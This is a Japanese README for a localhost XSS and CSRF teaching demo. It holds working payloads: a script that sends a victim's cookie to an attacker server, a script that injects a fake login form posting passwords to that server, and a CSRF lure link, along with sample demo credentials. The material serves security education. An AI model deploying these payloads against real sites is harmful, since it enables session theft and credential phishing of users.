
---

# 🛡️ XSS-Demo：セキュリティ学習用デモサイト

このデモでは、**クロスサイトスクリプティング（XSS）** や **CSRF（クロスサイトリクエストフォージェリ）** の仕組みを体験できます。

⚠️ **この内容は学習目的のみに使用してください。実際のサービスに対する攻撃・悪用は禁止です。**

---

## 🚀 サーバー起動方法

1. `localhost:3000` にサーバーを立ててください。
2. ブラウザで `index.html` にアクセスします。

---

## 🔐 ログイン用アカウント

|  ユーザー名 |   パスワード   |
| :----: | :-------: |
|  test  |  test123  |
|   bob  |   bob123  |
| poteko | poteko123 |

---

## 💣 attacker フォルダの使い方（攻撃デモ）

このフォルダ内には攻撃シナリオ用のコードが入っています。

1. `attacker-server.js` を起動して `localhost:6010` でサーバーを立ててください。
2. 以下のスクリプトを掲示板に投稿して、挙動を確認していきましょう。

---

### 🥷 1. Cookieを盗むスクリプト

```html
<script>
location.href = 'http://localhost:6010/getCookie?cookie=' + document.cookie;
</script>
```

* このコードを掲示板に投稿。
* 投稿後、**別のアカウントでログイン**。
* `attacker/stolen-data.txt` に Cookie が記録されていれば成功です。
* 注意：このスクリプトはページを開くたびに実行されます。**次に進む前に投稿を削除してください。**

---

### 🎣 2. フィッシングフォームの表示

```html
<script>
document.body.innerHTML = `
  <form method="POST" action="http://localhost:6010/getLogin">
    <div>ユーザー名:<br><input type="text" name="id"></div>
    <div>パスワード:<br><input type="password" name="password"></div>
    <input type="submit" value="ログイン">
  </form>
`;
</script>
```

* 掲示板の投稿として書き込むと、ページに偽のログインフォームが表示されます。
* 入力すると、**ユーザー名とパスワードが攻撃者に送信されます。**
* 投稿は忘れずに削除してください。

---

### 🧨 3. CSRF攻撃の実験

```html
<a href="http://localhost:3000/xss-demo/attacker/csrf.html">１００万円今ならもらえる！</a>
```

* ユーザーがこのリンクをクリックすると、**掲示板に勝手に投稿**されるような操作が実行されます。
* CSRFは、**本人の意図に反して操作が実行されてしまう**ことが問題です。

---

## 🧠 補足：XSSやCSRFってなに？

| 用語                          | 説明                                              |
| --------------------------- | ----------------------------------------------- |
| **XSS（クロスサイトスクリプティング）**     | 悪意のあるスクリプトをWebページに仕込み、他のユーザーの情報（Cookieなど）を盗む攻撃。 |
| **CSRF（クロスサイトリクエストフォージェリ）** | ログイン中のユーザーに気づかれずに、意図しない操作（投稿・削除など）を実行させる攻撃。     |

---

